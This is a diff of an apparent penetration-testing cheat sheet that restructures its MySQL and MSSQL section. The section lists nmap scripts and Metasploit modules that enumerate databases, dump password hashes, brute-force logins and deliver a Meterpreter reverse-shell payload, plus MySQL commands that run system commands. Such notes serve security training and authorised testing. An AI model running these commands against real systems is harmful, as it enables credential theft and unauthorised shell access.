@@ -298,16 +298,34 @@ cewl http://some.app/for/scan --with-numbers > wordlist
 
 --------------------------------------------------------------------------------------------------------------------------------
 
-# SQL
+# MYSQL
 
 --------------------------------------------------------------------------------------------------------------------------------
+- What is MySQL
+MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL
+RDBMS: software or service used to create and manage databases based on a relational model
 
-#### sql nmap scan 
-- nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
-- nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
-- nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
+## MySQL enumeration
+- MySQL tools
+```
+sudo apt install default-mysql-client
+```
+- connect to mysql
+```
+mysql -h [IP] -u [username] -p 
+```
 
-#### sql metasploit scan
+- sql nmap scan 
+  - nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql- variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
+  - nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
+  - nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
+
+- sql metasploit enumeration module
+```
+auxiliary/admin/mysql/mysql_sql
+```
+
+- sql metasploit scan
 ```
   msf > use auxiliary/scanner/mssql/mssql_ping
   msf> use auxiliary/scanner/mssql/mssql_login
@@ -319,13 +337,22 @@ Gain shell using gathered credentials
   msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
-#### mysql commands
+- mysql metasploit sql schema dump module
+```
+mysql_schemadump
+```
+
+- mysql metasploit sql table and columns dump module
+```
+auxiliary/scanner/mysql/mysql_hashdump
+```
+
+- mysql commands
 ```
 mysql> select do_system('id');
 mysql> \! sh
 ```
-
-#### mssql server config file
+- mssql server config file
 ```
 cat freetds.conf
 
